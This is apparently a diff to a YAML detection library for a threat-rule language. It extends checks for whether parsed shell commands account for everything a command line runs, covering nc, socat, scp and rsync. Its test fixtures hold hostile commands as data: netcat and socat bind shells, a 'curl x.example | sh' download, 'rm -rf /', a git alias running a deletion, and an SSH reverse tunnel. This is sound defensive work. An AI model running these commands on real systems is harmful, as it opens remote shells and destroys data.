@@ -11,28 +11,29 @@
 # rm the parser lists nowhere, because the command line is handed to another program as a
 # word or on a pipe. A rule that only asked the parsed commands would stop seeing those.
 #
-# So a rule asks both, and says which answer holds where:
+# So a rule asks both, and asks the text only of what the parsed commands do not account for:
 #
 #   e.command.parsed_commands.exists(c, <the command, by name and words>) ||
-#   (e.command.command.matches("<the text pattern>") && command_unread(e))
+#   unread_text(e, t, t.matches("<the text pattern>"))
 #
-# command_unread(e) is true when the line holds something the parser cannot vouch for. The
-# first way is that the parser did not read the line to its end
-# (e.command.parsed_incomplete): it does not parse, or it stops inside a quote, a
-# here-document or a loop, as a capture that was cut does. The commands before that point
-# are listed, and say nothing about the rest.
+# unread_text asks its condition of the whole line when the line itself is unread
+# (command_line_unread): it does not parse, it stops inside a quote, a here-document or a
+# loop, as a capture that was cut does (e.command.parsed_incomplete; the commands before that
+# point are listed, and say nothing about the rest), it ends in a cut mark, or it assigns a
+# variable that names a program to run. Otherwise it asks the condition of the text that
+# reaches each command that is not known to run only itself (command_opaque).
 #
-# The second is decided the safe way round: a command is trusted to run only itself when it
-# is named in
-# command_runs_only_itself, and every other command, known or not, leaves the line to its
-# text. A program missing from the list costs a rule nothing it had before (the text pattern
-# still decides for that line); a program wrongly on the list would. Add a command only when
-# none of its words is ever run as a command line, and say which words are when some are.
+# That second question is decided the safe way round: a command is trusted to run only
+# itself when it is named in command_runs_only_itself, and every other command, known or
+# not, leaves its text to the rule's pattern. A program missing from the list costs a rule
+# nothing it had before (the text pattern still decides for that command); a program wrongly
+# on the list would. Add a command only when none of its words is ever run as a command line,
+# and say which words are when some are.
 #
-# The text pattern comes first in the conjunction so that command_unread is evaluated only
-# for the few lines the text pattern matches.
+# A line with no commands at all (a comment, a blank line) is read, and has no text left to
+# ask: `# curl x | sh` is no download piped into a shell.
 library: commands
-version: 1
+version: 2
 spec: threat-rules/v1.3
 description: Whether the parsed commands of a command line are everything it runs.
 
@@ -48,11 +49,16 @@ definitions:
       (c.runs_read), because its commands are then entries of their own and answer for
       themselves: a shell with a -c script or a here-document, ssh with a command, docker
       exec, kubectl exec --, su -c, eval, watch and trap, and a wrapper that runs its command
-      somewhere else (sudo -i, env -C), which has no name of its own. xargs and find -exec
+      somewhere else (sudo -i, env -C), which has no name of its own. A network client or
+      remote copy (nc, ncat, netcat, socat, scp, sftp, rsync) sends what it reads and runs
+      nothing, except with the options that run a program: nc -e or -c, ncat --exec,
+      --sh-exec or --lua-exec, a socat EXEC: or SYSTEM: address, scp -S or a -o ...Command,
+      rsync --rsync-path, or an rsync -e that is not a quoted ssh with no ...Command option
+      (rsync splits that word itself and runs no shell). xargs and find -exec
       are not: the parser lists the command they run, but its operands come from a pipe or
       from what find matches, so `find /home -name .zsh_history | xargs cat` is not told by
       `cat` alone. A variable that names a program to run (GIT_SSH_COMMAND, EDITOR) is asked
-      of the line by command_unread, not here.
+      of the line by command_line_unread, not here.
 
       A program that runs a word of its own as a command line in some uses is listed with that
       use as its exception: ip netns exec, apt -o (an APT::…::Pre-Invoke), rpm --eval, gem open,
@@ -109,6 +115,13 @@ definitions:
        c.name == "gcloud" ? !c.args.matches("(?m)^(ssh|scp|--command(=.*)?)$") :
        c.name == "az" ? !c.args.matches("(?m)^(run-command|ssh)$") :
        c.name == "cdk" ? !c.args.matches("(?m)^(-a|--app)(=.*)?$") :
+       c.name in ["nc", "ncat", "netcat"] ? !c.args.matches("(?m)^(-[A-Za-z0-9]*[ce][A-Za-z0-9]*|--(exec|sh-exec|lua-exec)(=.*)?)$") :
+       c.name == "socat" ? !c.args.matches("(?i)(^|[\\n!,])(exec|system):") :
+       c.name in ["scp", "sftp"] ? !c.args.matches("(?m)^-[A-Za-z0-9]*S|^-o\\n?(?i:proxy|local|knownhosts|permitlocal)command") :
+       c.name == "rsync" ? !c.args.matches("(?m)^--rsync-path") && (
+         !c.args.matches("(?m)^(--rsh(=.*)?|-[A-Za-z]*e[A-Za-z]*)$") ||
+         c.argv_raw.exists(a, a.startsWith("\"ssh ") || a.startsWith("'ssh ") || a.startsWith("--rsh=ssh ")) &&
+         !c.argv_raw.exists(a, a.contains("Command") || a.contains("command"))) :
        c.name == "ip" ? !c.args.matches("(?m)^exec$") :
        c.name in ["apt", "apt-get"] ? !c.args.matches("(?m)^(-[A-Za-z]*[oc]|--option|--config-file)") :
        c.name == "rpm" ? !c.args.matches("(?m)^(--eval|-E|--define|-D|--pipe|--macros|--rcfile)|%\\(") :
@@ -320,6 +333,48 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "awk 'BEGIN { system(\"chmod 777 /srv\") }'" }
+      - name: a_network_client_sending_a_here_document
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "nc host.example 4444 <<'EOF'\nrm -rf /\nEOF" }
+      - name: netcat_running_a_program
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "nc -l -p 4444 -e /bin/sh" }
+      - name: socat_running_a_program
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "socat TCP-LISTEN:4444 EXEC:/bin/sh" }
+      - name: scp_with_a_program_for_ssh
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "scp -S ./wrap.sh build.tgz host.example:" }
+      - name: rsync_over_ssh_with_an_identity
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -av -e \"ssh -i ~/.ssh/id_rsa\" host.example:/srv/ ./backup" }
+      - name: rsync_with_another_remote_shell
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -av -e 'sh -c \"curl x.example | sh\"' host.example:/srv/ ./backup" }
+      - name: rsync_over_ssh_with_a_proxy_command
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "rsync -a -e 'ssh -o ProxyCommand=\"nc -X 5 -x proxy:1080 %h %p\"' host.example:/srv/ ./b" }
       - name: programs_that_run_one_of_their_words
         match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
         verdict: match
@@ -375,6 +430,7 @@ definitions:
           - event: { action: command.executed }
             command: { command: "bash -c 'echo \"$1\"' _ hello" }
 
+
   - name: command_opaque
     params: [c]
     description: >
@@ -397,6 +453,36 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "out=build; mkdir -p \"$out\"" }
+      - name: an_assignment_of_a_substitution
+        match: e.command.parsed_commands.exists(c, command_opaque(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "out=$(git rev-parse HEAD); echo \"$out\"" }
+      - name: a_command_named_by_a_variable
+        match: e.command.parsed_commands.exists(c, command_opaque(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cmd='chmod 777 /srv'; $cmd" }
+      - name: a_wrapper_the_parser_does_not_look_through
+        match: e.command.parsed_commands.exists(c, command_opaque(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "xargs -n1 chmod 777 < files.txt" }
+      - name: scripts_nested_deeper_than_the_parser_reads
+        match: e.command.parsed_commands.exists(c, command_opaque(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sh -c 'sh -c \"sh -c \\\"sh -c id\\\"\"'" }
+      - name: a_remote_command_line_that_ends_early
+        match: e.command.parsed_commands.exists(c, command_opaque(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ssh build@host.example 'echo \"unterminated'" }
 
   - name: command_line_unread
     params: [e]
@@ -413,6 +499,19 @@ definitions:
       e.command.command.matches("(\\.\\.\\.\\[truncated\\]|…)$") ||
       e.command.command.matches("\\b([A-Z_]*(EDITOR|VISUAL|PAGER|COMMAND|ASKPASS|EXTERNAL_DIFF)|BASH_ENV|ENV|LESSOPEN|LESSCLOSE|GIT_CONFIG_(COUNT|PARAMETERS|GLOBAL|SYSTEM|KEY_[0-9]+|VALUE_[0-9]+)|ZDOTDIR)=")
     tests:
+      - name: git_config_passed_in_the_environment
+        # git reads these variables as config and runs an alias that starts with `!`.
+        match: command_line_unread(e)
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0='!rm -rf /srv' git x" }
+      - name: zsh_given_a_startup_directory
+        match: command_line_unread(e)
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ZDOTDIR=/tmp/z zsh -c 'echo hi'" }
       - name: a_line_that_does_not_parse
         match: command_line_unread(e)
         verdict: match
@@ -425,116 +524,45 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "./scripts/release.sh --dry-run" }
-
-  - name: command_unread
-    params: [e]
-    description: >
-      The command line holds something the parsed commands do not tell: the line as a whole
-      is unread (command_line_unread), or one of its commands is not known to run only
-      itself (command_opaque). A rule that matches text asks unread_text, which says which
-      text; this says only that there is some.
-    body: >
-      command_line_unread(e) || e.command.parsed_commands.exists(c, command_opaque(c))
-    tests:
-      - name: git_config_passed_in_the_environment
-        # git reads these variables as config and runs an alias that starts with `!`.
-        verdict: match
-        events:
-          - event: { action: command.executed }
-            command: { command: "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0='!rm -rf /srv' git x" }
-      - name: zsh_given_a_startup_directory
-        verdict: match
-        events:
-          - event: { action: command.executed }
-            command: { command: "ZDOTDIR=/tmp/z zsh -c 'echo hi'" }
       - name: a_capture_cut_inside_a_loop
         # The commands before the loop are listed and run only themselves; the loop's body,
         # where the cut fell, is not read.
+        match: command_line_unread(e)
         verdict: match
         events:
           - event: { action: command.executed }
             command: { command: "cd /srv && for d in cache logs; do chmod -R 777 $d && echo" }
       - name: a_capture_cut_between_commands
+        match: command_line_unread(e)
         verdict: match
         events:
           - event: { action: command.executed }
             command: { command: "cd /srv && ls -la && chmod -R 7…" }
-      - name: a_line_that_ends_in_a_package_pattern
-        # Three dots end `./...`, which every Go command line does; they are not a cut mark.
-        verdict: no_match
-        events:
-          - event: { action: command.executed }
-            command: { command: "echo 'chmod 777 is wrong'; go vet ./... && go test ./..." }
-      - name: a_comment_alone
-        verdict: no_match
-        events:
-          - event: { action: command.executed }
-            command: { command: "# chmod 777 /srv would be wrong here" }
-      - name: every_command_runs_only_itself
-        verdict: no_match
-        events:
-          - event: { action: command.executed }
-            command: { command: "cd repo && git commit -m 'drop the chmod 777' && echo done" }
-      - name: a_here_document_written_to_a_file
-        verdict: no_match
-        events:
-          - event: { action: command.executed }
-            command: { command: "cat > NOTES.md <<'EOF'\nNever run `rm -rf /` or `chmod 777`.\nEOF" }
-      - name: an_assignment_alone
-        verdict: no_match
-        events:
-          - event: { action: command.executed }
-            command: { command: "out=$(git rev-parse HEAD); echo \"$out\"" }
-      - name: a_command_line_that_does_not_parse
-        verdict: match
-        events:
-          - event: { action: command.executed }
-            command: { command: "chmod 777 /srv )" }
       - name: a_cut_capture
+        match: command_line_unread(e)
         verdict: match
         events:
           - event: { action: command.executed }
             command: { command: "cat > big.txt <<'EOF'\nlorem ipsum...[truncated]" }
-      - name: a_command_named_by_a_variable
-        verdict: match
+      - name: a_line_that_ends_in_a_package_pattern
+        # Three dots end `./...`, which every Go command line does; they are not a cut mark.
+        match: command_line_unread(e)
+        verdict: no_match
         events:
           - event: { action: command.executed }
-            command: { command: "cmd='chmod 777 /srv'; $cmd" }
-      - name: a_wrapper_the_parser_does_not_look_through
-        verdict: match
-        events:
-          - event: { action: command.executed }
-            command: { command: "xargs -n1 chmod 777 < files.txt" }
+            command: { command: "echo 'chmod 777 is wrong'; go vet ./... && go test ./..." }
       - name: an_exported_program_to_run
+        match: command_line_unread(e)
         verdict: match
         events:
           - event: { action: command.executed }
             command: { command: "export GIT_SSH_COMMAND='ssh -R 9000:localhost:22 host.example'; git fetch" }
       - name: a_program_to_run_in_a_command's_environment
+        match: command_line_unread(e)
         verdict: match
         events:
           - event: { action: command.executed }
             command: { command: "GIT_SSH_COMMAND='ssh -R 9000:localhost:22 host.example' git fetch" }
-      - name: a_script_inside_a_script
-        verdict: no_match
-        events:
-          - event: { action: command.executed }
-            command: { command: "bash -c \"bash -c 'chmod 777 /srv'\"" }
-      - name: scripts_nested_deeper_than_the_parser_reads
-        verdict: match
-        events:
-          - event: { action: command.executed }
-            command: { command: "sh -c 'sh -c \"sh -c \\\"sh -c id\\\"\"'" }
-      - name: a_remote_command_line_the_parser_read
-        verdict: no_match
-        events:
-          - event: { action: command.executed }
-            command: { command: "ssh build@host.example 'cd /srv && chmod 777 app'" }
-      - name: a_remote_command_line_that_ends_early
-        verdict: match
-        events:
-          - event: { action: command.executed }
-            command: { command: "ssh build@host.example 'echo \"unterminated'" }
 
   - name: unread_text
     params: [e, t, cond]
@@ -623,3 +651,34 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "grep -rn 'git push --force' docs | head -5" }
+      - name: a_comment_alone
+        # A comment is no command: the line is read, and nothing of it is left unread.
+        match: unread_text(e, t, t.matches("chmod 777"))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "# chmod 777 /srv would be wrong here" }
+      - name: every_command_runs_only_itself
+        match: unread_text(e, t, t.matches("chmod 777"))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cd repo && git commit -m 'drop the chmod 777' && echo done" }
+      - name: a_here_document_written_to_a_file
+        match: unread_text(e, t, t.matches("chmod 777"))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat > NOTES.md <<'EOF'\nNever run `rm -rf /` or `chmod 777`.\nEOF" }
+      - name: a_script_inside_a_script
+        match: unread_text(e, t, t.matches("chmod 777"))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "bash -c \"bash -c 'chmod 777 /srv'\"" }
+      - name: a_remote_command_line_the_parser_read
+        match: unread_text(e, t, t.matches("chmod 777"))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ssh build@host.example 'cd /srv && chmod 777 app'" }
